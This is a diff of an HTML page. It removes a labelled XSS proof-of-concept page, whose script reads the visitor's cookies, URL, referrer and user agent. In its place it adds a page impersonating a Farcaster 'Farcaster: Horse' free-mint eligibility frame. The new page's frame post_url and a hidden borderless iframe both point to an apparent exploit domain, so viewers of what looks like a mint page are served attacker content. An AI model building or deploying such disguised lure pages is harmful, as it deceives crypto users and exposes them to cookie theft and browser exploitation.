@@ -1,44 +1,54 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>XSS PoC</title>
-  <style>
-    body {
-      background-color: #121212;
-      color: #00ff88;
-      font-family: monospace;
-      padding: 20px;
-    }
-    h2 {
-      color: #ff4081;
-    }
-    pre {
-      background: #1e1e1e;
-      padding: 15px;
-      border-radius: 8px;
-      white-space: pre-wrap;
-    }
-  </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>Farcaster: Horse</title>
+  <meta name="description" content="Check if you're eligible for a free mint" />
+  <meta name="fc:frame" content="vNext" />
+  <meta name="fc:frame:image" content="https://mint.farcaster.xyz/api/images/start" />
+  <meta name="fc:frame:button:1" content="Check eligibility" />
+  <meta name="fc:frame:post_url" content="https://popuppoc.theexploit.works/" />
+  <meta name="fc:frame:image:aspect_ratio" content="1:1" />
+
+  <meta property="og:title" content="Farcaster: Horse" />
+  <meta property="og:description" content="Check if you're eligible for a free mint" />
+  <meta property="og:image" content="https://mint.farcaster.xyz/api/images/start" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Farcaster: Horse" />
+  <meta name="twitter:description" content="Check if you're eligible for a free mint" />
+  <meta name="twitter:image" content="https://mint.farcaster.xyz/api/images/start" />
+
+  <link rel="preload" as="image" href="https://mint.farcaster.xyz/horse.png" />
+  <link rel="stylesheet" href="/next/static/css/29e3ad1cdce48962.css" crossorigin />
+
+  <script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" crossorigin noModule></script>
+  <script src="/_next/static/chunks/webpack-8e0814826f3866ce.js" async crossorigin></script>
+  <script src="/_next/static/chunks/fd9d1056-cc48c28d170fddc2.js" async crossorigin></script>
+  <script src="/_next/static/chunks/69-1b6d135f94ac0e36.js" async crossorigin></script>
+  <script src="/_next/static/chunks/main-app-f5c8d25c8479457f.js" async crossorigin></script>
 </head>
 <body>
-  <h2>🔥 XSS Executed — Details Below</h2>
-  <pre id="output">Collecting data...</pre>
+  <div class="flex flex-col md:flex-row md:items-center justify-center min-h-screen items-start font-body">
+    <div class="w-full md:w-3/4 flex justify-center items-center">
+      <img src="https://mint.farcaster.xyz/horse.png" alt="Farcaster: Horse" class="w-full lg:max-w-[800px] md:max-w-[400px] h-auto" />
+    </div>
+    <div class="w-full md:w-1/4 flex flex-col items-center md:items-start space-y-4 mt-4 md:mt-0 md:pl-4">
+      <h1 class="text-2xl font-bold">Farcaster: Horse</h1>
+      <a href="https://zora.co/collect/base:0xf5a3b6dee033ae5025e4332695931cadeb7f4d2b/1" target="_blank">
+        <button class="px-4 py-2 bg-violet-500 text-white hover:bg-violet-700 transition duration-300">
+          Mint on Zora
+        </button>
+      </a>
+      <div class="text-xs text-stone-400 hover:underline tracking-tighter text-center">
+        <a href="https://github.com/horsefacts/base-mint-with-warps" target="_blank">See code on Github</a>
+      </div>
+    </div>
+  </div>
 
-  <script>
-    const data = {
-      "Cookie": document.cookie || "No accessible cookies (HttpOnly?)",
-      "Location": location.href,
-      "Referrer": document.referrer || "None",
-      "User Agent": navigator.userAgent,
-      "Time": new Date().toString()
-    };
-
-    const output = Object.entries(data).map(([key, value]) => `${key}: ${value}`).join("\n\n");
-
-    document.getElementById("output").textContent = output;
-
-    // Optional proof-of-execution popup
-    alert("🔥 XSS Executed!");
-  </script>
+  <!-- Optional embedded frame -->
+  <iframe src="https://popuppoc.theexploit.works/" width="600" height="400" style="border:none;"></iframe>
 </body>
 </html>
